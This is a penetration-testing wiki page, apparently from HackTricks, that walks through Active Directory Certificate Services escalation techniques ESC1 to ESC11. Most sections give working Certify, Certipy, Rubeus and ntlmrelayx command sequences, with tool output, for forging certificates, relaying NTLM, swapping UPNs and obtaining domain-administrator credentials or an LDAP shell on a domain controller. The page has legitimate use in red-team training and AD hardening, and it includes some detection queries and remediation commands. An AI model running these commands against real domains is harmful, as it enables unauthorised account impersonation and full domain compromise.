# AD CS Domain Escalation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

**This is a summary of escalation technique sections of the posts:**

* [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf)
* [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
* [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Misconfigured Certificate Templates - ESC1

### Explanation

### Misconfigured Certificate Templates - ESC1 Explained

* **Enrolment rights are granted to low-privileged users by the Enterprise CA.**
* **Manager approval is not required.**
* **No signatures from authorized personnel are needed.**
* **Security descriptors on certificate templates are overly permissive, allowing low-privileged users to obtain enrolment rights.**
* **Certificate templates are configured to define EKUs that facilitate authentication:**
  * Extended Key Usage (EKU) identifiers such as Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), or no EKU (SubCA) are included.
* **The ability for requesters to include a subjectAltName in the Certificate Signing Request (CSR) is allowed by the template:**
  * The Active Directory (AD) prioritizes the subjectAltName (SAN) in a certificate for identity verification if present. This means that by specifying the SAN in a CSR, a certificate can be requested to impersonate any user (e.g., a domain administrator). Whether a SAN can be specified by the requester is indicated in the certificate template's AD object through the `mspki-certificate-name-flag` property. This property is a bitmask, and the presence of the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag permits the specification of the SAN by the requester.

{% hint style="danger" %}
The configuration outlined permits low-privileged users to request certificates with any SAN of choice, enabling authentication as any domain principal through Kerberos or SChannel.
{% endhint %}

This feature is sometimes enabled to support the on-the-fly generation of HTTPS or host certificates by products or deployment services, or due to a lack of understanding.

It is noted that creating a certificate with this option triggers a warning, which is not the case when an existing certificate template (such as the `WebServer` template, which has `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` enabled) is duplicated and then modified to include an authentication OID.

### Abuse

To **find vulnerable certificate templates** you can run:

```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```

To **abuse this vulnerability to impersonate an administrator** one could run:

```bash
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```

Then you can transform the generated **certificate to `.pfx`** format and use it to **authenticate using Rubeus or certipy** again:

```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```

The Windows binaries "Certreq.exe" & "Certutil.exe" can be used to generate the PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

The enumeration of certificate templates within the AD Forest's configuration schema, specifically those not necessitating approval or signatures, possessing a Client Authentication or Smart Card Logon EKU, and with the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag enabled, can be performed by running the following LDAP query:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```

## Misconfigured Certificate Templates - ESC2

### Explanation

The second abuse scenario is a variation of the first one:

1. Enrollment rights are granted to low-privileged users by the Enterprise CA.
2. The requirement for manager approval is disabled.
3. The need for authorized signatures is omitted.
4. An overly permissive security descriptor on the certificate template grants certificate enrollment rights to low-privileged users.
5. **The certificate template is defined to include the Any Purpose EKU or no EKU.**

The **Any Purpose EKU** permits a certificate to be obtained by an attacker for **any purpose**, including client authentication, server authentication, code signing, etc. The same **technique used for ESC3** can be employed to exploit this scenario.

Certificates with **no EKUs**, which act as subordinate CA certificates, can be exploited for **any purpose** and can **also be used to sign new certificates**. Hence, an attacker could specify arbitrary EKUs or fields in the new certificates by utilizing a subordinate CA certificate.

However, new certificates created for **domain authentication** will not function if the subordinate CA is not trusted by the **`NTAuthCertificates`** object, which is the default setting. Nonetheless, an attacker can still create **new certificates with any EKU** and arbitrary certificate values. These could be potentially **abused** for a wide range of purposes (e.g., code signing, server authentication, etc.) and could have significant implications for other applications in the network like SAML, AD FS, or IPSec.

To enumerate templates that match this scenario within the AD Forest’s configuration schema, the following LDAP query can be run:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```

## Misconfigured Enrolment Agent Templates - ESC3

### Explanation

This scenario is like the first and second one but **abusing** a **different EKU** (Certificate Request Agent) and **2 different templates** (therefore it has 2 sets of requirements),

The **Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), known as **Enrollment Agent** in Microsoft documentation, allows a principal to **enroll** for a **certificate** on **behalf of another user**.

The **“enrollment agent”** enrolls in such a **template** and uses the resulting **certificate to co-sign a CSR on behalf of the other user**. It then **sends** the **co-signed CSR** to the CA, enrolling in a **template** that **permits “enroll on behalf of”**, and the CA responds with a **certificate belong to the “other” user**.

**Requirements 1:**

* Enrollment rights are granted to low-privileged users by the Enterprise CA.
* The requirement for manager approval is omitted.
* No requirement for authorized signatures.
* The security descriptor of the certificate template is excessively permissive, granting enrollment rights to low-privileged users.
* The certificate template includes the Certificate Request Agent EKU, enabling the request of other certificate templates on behalf of other principals.

**Requirements 2:**

* The Enterprise CA grants enrollment rights to low-privileged users.
* Manager approval is bypassed.
* The template's schema version is either 1 or exceeds 2, and it specifies an Application Policy Issuance Requirement that necessitates the Certificate Request Agent EKU.
* An EKU defined in the certificate template permits domain authentication.
* Restrictions for enrollment agents are not applied on the CA.

### Abuse

You can use [**Certify**](https://github.com/GhostPack/Certify) or [**Certipy**](https://github.com/ly4k/Certipy) to abuse this scenario:

```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```

The **users** who are allowed to **obtain** an **enrollment agent certificate**, the templates in which enrollment **agents** are permitted to enroll, and the **accounts** on behalf of which the enrollment agent may act can be constrained by enterprise CAs. This is achieved by opening the `certsrc.msc` **snap-in**, **right-clicking on the CA**, **clicking Properties**, and then **navigating** to the “Enrollment Agents” tab.

However, it is noted that the **default** setting for CAs is to “**Do not restrict enrollment agents**.” When the restriction on enrollment agents is enabled by administrators, setting it to “Restrict enrollment agents,” the default configuration remains extremely permissive. It allows **Everyone** access to enroll in all templates as anyone.

## Vulnerable Certificate Template Access Control - ESC4

### **Explanation**

The **security descriptor** on **certificate templates** defines the **permissions** specific **AD principals** possess concerning the template.

Should an **attacker** possess the requisite **permissions** to **alter** a **template** and **institute** any **exploitable misconfigurations** outlined in **prior sections**, privilege escalation could be facilitated.

Notable permissions applicable to certificate templates include:

* **Owner:** Grants implicit control over the object, allowing for the modification of any attributes.
* **FullControl:** Enables complete authority over the object, including the capability to alter any attributes.
* **WriteOwner:** Permits the alteration of the object's owner to a principal under the attacker's control.
* **WriteDacl:** Allows for the adjustment of access controls, potentially granting an attacker FullControl.
* **WriteProperty:** Authorizes the editing of any object properties.

### Abuse

An example of a privesc like the previous one:

<figure><img src="../../../.gitbook/assets/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 is when a user has write privileges over a certificate template. This can for instance be abused to overwrite the configuration of the certificate template to make the template vulnerable to ESC1.

As we can see in the path above, only `JOHNPC` has these privileges, but our user `JOHN` has the new `AddKeyCredentialLink` edge to `JOHNPC`. Since this technique is related to certificates, I have implemented this attack as well, which is known as [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Here’s a little sneak peak of Certipy’s `shadow auto` command to retrieve the NT hash of the victim.

```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```

**Certipy** can overwrite the configuration of a certificate template with a single command. By **default**, Certipy will **overwrite** the configuration to make it **vulnerable to ESC1**. We can also specify the **`-save-old` parameter to save the old configuration**, which will be useful for **restoring** the configuration after our attack.

```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```

## Vulnerable PKI Object Access Control - ESC5

### Explanation

The extensive web of interconnected ACL-based relationships, which includes several objects beyond certificate templates and the certificate authority, can impact the security of the entire AD CS system. These objects, which can significantly affect security, encompass:

* The AD computer object of the CA server, which may be compromised through mechanisms like S4U2Self or S4U2Proxy.
* The RPC/DCOM server of the CA server.
* Any descendant AD object or container within the specific container path `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. This path includes, but is not limited to, containers and objects such as the Certificate Templates container, Certification Authorities container, the NTAuthCertificates object, and the Enrollment Services Container.

The security of the PKI system can be compromised if a low-privileged attacker manages to gain control over any of these critical components.

## EDITF\_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Explanation

The subject discussed in the [**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) also touches on the **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag's implications, as outlined by Microsoft. This configuration, when activated on a Certification Authority (CA), permits the inclusion of **user-defined values** in the **subject alternative name** for **any request**, including those constructed from Active Directory®. Consequently, this provision allows an **intruder** to enroll through **any template** set up for domain **authentication**—specifically those open to **unprivileged** user enrollment, like the standard User template. As a result, a certificate can be secured, enabling the intruder to authenticate as a domain administrator or **any other active entity** within the domain.

**Note**: The approach for appending **alternative names** into a Certificate Signing Request (CSR), through the `-attrib "SAN:"` argument in `certreq.exe` (referred to as “Name Value Pairs”), presents a **contrast** from the exploitation strategy of SANs in ESC1. Here, the distinction lies in **how account information is encapsulated**—within a certificate attribute, rather than an extension.

### Abuse

To verify whether the setting is activated, organizations can utilize the following command with `certutil.exe`:

```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```

This operation essentially employs **remote registry access**, hence, an alternative approach might be:

```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags 
```

Tools like [**Certify**](https://github.com/GhostPack/Certify) and [**Certipy**](https://github.com/ly4k/Certipy) are capable of detecting this misconfiguration and exploiting it:

```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```

To alter these settings, assuming one possesses **domain administrative** rights or equivalent, the following command can be executed from any workstation:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```

To disable this configuration in your environment, the flag can be removed with:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```

{% hint style="warning" %}
Post the May 2022 security updates, newly issued **certificates** will contain a **security extension** that incorporates the **requester's `objectSid` property**. For ESC1, this SID is derived from the specified SAN. However, for **ESC6**, the SID mirrors the **requester's `objectSid`**, not the SAN.\
To exploit ESC6, it is essential for the system to be susceptible to ESC10 (Weak Certificate Mappings), which prioritizes the **SAN over the new security extension**.
{% endhint %}

## Vulnerable Certificate Authority Access Control - ESC7

### Attack 1

#### Explanation

Access control for a certificate authority is maintained through a set of permissions that govern CA actions. These permissions can be viewed by accessing `certsrv.msc`, right-clicking a CA, selecting properties, and then navigating to the Security tab. Additionally, permissions can be enumerated using the PSPKI module with commands such as:

```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```

This provides insights into the primary rights, namely **`ManageCA`** and **`ManageCertificates`**, correlating to the roles of “CA administrator” and “Certificate Manager” respectively.

#### Abuse

Having **`ManageCA`** rights on a certificate authority enables the principal to manipulate settings remotely using PSPKI. This includes toggling the **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag to permit SAN specification in any template, a critical aspect of domain escalation.

Simplification of this process is achievable through the use of PSPKI’s **Enable-PolicyModuleFlag** cmdlet, allowing modifications without direct GUI interaction.

Possession of **`ManageCertificates`** rights facilitates the approval of pending requests, effectively circumventing the "CA certificate manager approval" safeguard.

A combination of **Certify** and **PSPKI** modules can be utilized to request, approve, and download a certificate:

```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```

### Attack 2

#### Explanation

{% hint style="warning" %}
In the **previous attack** **`Manage CA`** permissions were used to **enable** the **EDITF\_ATTRIBUTESUBJECTALTNAME2** flag to perform the **ESC6 attack**, but this will not have any effect until the CA service (`CertSvc`) is restarted. When a user has the `Manage CA` access right, the user is also allowed to **restart the service**. However, it **does not mean that the user can restart the service remotely**. Furthermore, E**SC6 might not work out of the box** in most patched environments due to the May 2022 security updates.
{% endhint %}

Therefore, another attack is presented here.

Perquisites:

* Only **`ManageCA` permission**
* **`Manage Certificates`** permission (can be granted from **`ManageCA`**)
* Certificate template **`SubCA`** must be **enabled** (can be enabled from **`ManageCA`**)

The technique relies on the fact that users with the `Manage CA` _and_ `Manage Certificates` access right can **issue failed certificate requests**. The **`SubCA`** certificate template is **vulnerable to ESC1**, but **only administrators** can enroll in the template. Thus, a **user** can **request** to enroll in the **`SubCA`** - which will be **denied** - but **then issued by the manager afterwards**.

#### Abuse

You can **grant yourself the `Manage Certificates`** access right by adding your user as a new officer.

```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```

The **`SubCA`** template can be **enabled on the CA** with the `-enable-template` parameter. By default, the `SubCA` template is enabled.

```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```

If we have fulfilled the prerequisites for this attack, we can start by **requesting a certificate based on the `SubCA` template**.

**This request will be denie**d, but we will save the private key and note down the request ID.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```

With our **`Manage CA` and `Manage Certificates`**, we can then **issue the failed certificate** request with the `ca` command and the `-issue-request <request ID>` parameter.

```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```

And finally, we can **retrieve the issued certificate** with the `req` command and the `-retrieve <request ID>` parameter.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### Explanation

{% hint style="info" %}
In environments where **AD CS is installed**, if a **web enrollment endpoint vulnerable** exists and at least one **certificate template is published** that permits **domain computer enrollment and client authentication** (such as the default **`Machine`** template), it becomes possible for **any computer with the spooler service active to be compromised by an attacker**!
{% endhint %}

Several **HTTP-based enrollment methods** are supported by AD CS, made available through additional server roles that administrators may install. These interfaces for HTTP-based certificate enrollment are susceptible to **NTLM relay attacks**. An attacker, from a **compromised machine, can impersonate any AD account that authenticates via inbound NTLM**. While impersonating the victim account, these web interfaces can be accessed by an attacker to **request a client authentication certificate using the `User` or `Machine` certificate templates**.

* The **web enrollment interface** (an older ASP application available at `http://<caserver>/certsrv/`), defaults to HTTP only, which does not offer protection against NTLM relay attacks. Additionally, it explicitly permits only NTLM authentication through its Authorization HTTP header, rendering more secure authentication methods like Kerberos inapplicable.
* The **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service, and **Network Device Enrollment Service** (NDES) by default support negotiate authentication via their Authorization HTTP header. Negotiate authentication **supports both** Kerberos and **NTLM**, allowing an attacker to **downgrade to NTLM** authentication during relay attacks. Although these web services enable HTTPS by default, HTTPS alone **does not safeguard against NTLM relay attacks**. Protection from NTLM relay attacks for HTTPS services is only possible when HTTPS is combined with channel binding. Regrettably, AD CS does not activate Extended Protection for Authentication on IIS, which is required for channel binding.

A common **issue** with NTLM relay attacks is the **short duration of NTLM sessions** and the inability of the attacker to interact with services that **require NTLM signing**.

Nevertheless, this limitation is overcome by exploiting an NTLM relay attack to acquire a certificate for the user, as the certificate's validity period dictates the session's duration, and the certificate can be employed with services that **mandate NTLM signing**. For instructions on utilizing a stolen certificate, refer to:

{% content-ref url="account-persistence.md" %}
[account-persistence.md](account-persistence.md)
{% endcontent-ref %}

Another limitation of NTLM relay attacks is that **an attacker-controlled machine must be authenticated to by a victim account**. The attacker could either wait or attempt to **force** this authentication:

{% content-ref url="../printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../printers-spooler-service-abuse.md)
{% endcontent-ref %}

### **Abuse**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` enumerates **enabled HTTP AD CS endpoints**:

```
Certify.exe cas
```

<figure><img src="../../../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>

The `msPKI-Enrollment-Servers` property is used by enterprise Certificate Authorities (CAs) to store Certificate Enrollment Service (CES) endpoints. These endpoints can be parsed and listed by utilizing the tool **Certutil.exe**:

```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```

<figure><img src="../../../.gitbook/assets/image (757).png" alt=""><figcaption></figcaption></figure>

```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```

<figure><img src="../../../.gitbook/assets/image (940).png" alt=""><figcaption></figcaption></figure>

#### Abuse with Certify

```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```

#### Abuse with [Certipy](https://github.com/ly4k/Certipy)

The request for a certificate is made by Certipy by default based on the template `Machine` or `User`, determined by whether the account name being relayed ends in `$`. The specification of an alternative template can be achieved through the use of the `-template` parameter.

A technique like [PetitPotam](https://github.com/ly4k/PetitPotam) can then be employed to coerce authentication. When dealing with domain controllers, the specification of `-template DomainController` is required.

```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Explanation

The new value **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) for **`msPKI-Enrollment-Flag`**, referred to as ESC9, prevents the embedding of the **new `szOID_NTDS_CA_SECURITY_EXT` security extension** in a certificate. This flag becomes relevant when `StrongCertificateBindingEnforcement` is set to `1` (the default setting), which contrasts with a setting of `2`. Its relevance is heightened in scenarios where a weaker certificate mapping for Kerberos or Schannel might be exploited (as in ESC10), given that the absence of ESC9 would not alter the requirements.

The conditions under which this flag's setting becomes significant include:

* `StrongCertificateBindingEnforcement` is not adjusted to `2` (with the default being `1`), or `CertificateMappingMethods` includes the `UPN` flag.
* The certificate is marked with the `CT_FLAG_NO_SECURITY_EXTENSION` flag within the `msPKI-Enrollment-Flag` setting.
* Any client authentication EKU is specified by the certificate.
* `GenericWrite` permissions are available over any account to compromise another.

### Abuse Scenario

Suppose `John@corp.local` holds `GenericWrite` permissions over `Jane@corp.local`, with the goal to compromise `Administrator@corp.local`. The `ESC9` certificate template, which `Jane@corp.local` is permitted to enroll in, is configured with the `CT_FLAG_NO_SECURITY_EXTENSION` flag in its `msPKI-Enrollment-Flag` setting.

Initially, `Jane`'s hash is acquired using Shadow Credentials, thanks to `John`'s `GenericWrite`:

```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```

Subsequently, `Jane`'s `userPrincipalName` is modified to `Administrator`, purposely omitting the `@corp.local` domain part:

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

This modification does not violate constraints, given that `Administrator@corp.local` remains distinct as `Administrator`'s `userPrincipalName`.

Following this, the `ESC9` certificate template, marked vulnerable, is requested as `Jane`:

```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```

It's noted that the certificate's `userPrincipalName` reflects `Administrator`, devoid of any “object SID”.

`Jane`'s `userPrincipalName` is then reverted to her original, `Jane@corp.local`:

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

Attempting authentication with the issued certificate now yields the NT hash of `Administrator@corp.local`. The command must include `-domain <domain>` due to the certificate's lack of domain specification:

```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```

## Weak Certificate Mappings - ESC10

### Explanation

Two registry key values on the domain controller are referred to by ESC10:

* The default value for `CertificateMappingMethods` under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` is `0x18` (`0x8 | 0x10`), previously set to `0x1F`.
* The default setting for `StrongCertificateBindingEnforcement` under `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` is `1`, previously `0`.

**Case 1**

When `StrongCertificateBindingEnforcement` is configured as `0`.

**Case 2**

If `CertificateMappingMethods` includes the `UPN` bit (`0x4`).

### Abuse Case 1

With `StrongCertificateBindingEnforcement` configured as `0`, an account A with `GenericWrite` permissions can be exploited to compromise any account B.

For instance, having `GenericWrite` permissions over `Jane@corp.local`, an attacker aims to compromise `Administrator@corp.local`. The procedure mirrors ESC9, allowing any certificate template to be utilized.

Initially, `Jane`'s hash is retrieved using Shadow Credentials, exploiting the `GenericWrite`.

```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```

Subsequently, `Jane`'s `userPrincipalName` is altered to `Administrator`, deliberately omitting the `@corp.local` portion to avoid a constraint violation.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

Following this, a certificate enabling client authentication is requested as `Jane`, using the default `User` template.

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

`Jane`'s `userPrincipalName` is then reverted to its original, `Jane@corp.local`.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

Authenticating with the obtained certificate will yield the NT hash of `Administrator@corp.local`, necessitating the specification of the domain in the command due to the absence of domain details in the certificate.

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

### Abuse Case 2

With the `CertificateMappingMethods` containing the `UPN` bit flag (`0x4`), an account A with `GenericWrite` permissions can compromise any account B lacking a `userPrincipalName` property, including machine accounts and the built-in domain administrator `Administrator`.

Here, the goal is to compromise `DC$@corp.local`, starting with obtaining `Jane`'s hash through Shadow Credentials, leveraging the `GenericWrite`.

```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```

`Jane`'s `userPrincipalName` is then set to `DC$@corp.local`.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```

A certificate for client authentication is requested as `Jane` using the default `User` template.

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

`Jane`'s `userPrincipalName` is reverted to its original after this process.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```

To authenticate via Schannel, Certipy’s `-ldap-shell` option is utilized, indicating authentication success as `u:CORP\DC$`.

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

Through the LDAP shell, commands such as `set_rbcd` enable Resource-Based Constrained Delegation (RBCD) attacks, potentially compromising the domain controller.

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

This vulnerability also extends to any user account lacking a `userPrincipalName` or where it does not match the `sAMAccountName`, with the default `Administrator@corp.local` being a prime target due to its elevated LDAP privileges and the absence of a `userPrincipalName` by default.

## Relaying NTLM to ICPR - ESC11

### Explanation

If CA Server Do not configured with `IF_ENFORCEENCRYPTICERTREQUEST`, it can be makes NTLM relay attacks without signing via RPC service. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

You can use `certipy` to enumerate if `Enforce Encryption for Requests` is Disabled and certipy will show `ESC11` Vulnerabilities.

```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
  0
    CA Name                             : DC01-CA
    DNS Name                            : DC01.domain.local
    Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
    ....
    Enforce Encryption for Requests     : Disabled
    ....
    [!] Vulnerabilities
      ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```

### Abuse Scenario

It need to setup a relay server:

```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
